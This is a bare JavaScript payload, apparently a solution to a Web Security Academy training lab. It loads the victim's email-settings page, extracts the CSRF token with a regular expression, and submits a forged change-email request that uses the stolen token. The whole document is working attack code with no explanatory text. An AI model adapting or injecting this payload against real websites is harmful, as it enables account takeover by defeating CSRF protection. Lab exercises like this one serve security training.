<script>
	xhr = new XMLHttpRequest();
	xhr.onload = handleResponse;
	xhr.open("get", "https://ac171f961fa27cc380ab37bb00650015.web-security-academy.net/email", true);
	xhr.send();

	function handleResponse() {
		var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
	    var changeReq = new XMLHttpRequest();
	    changeReq.open('post', 'https://ac171f961fa27cc380ab37bb00650015.web-security-academy.net/email/change-email', true);
	    changeReq.send('csrf='+token+'&email=abc@gmail.com')
	}
</script>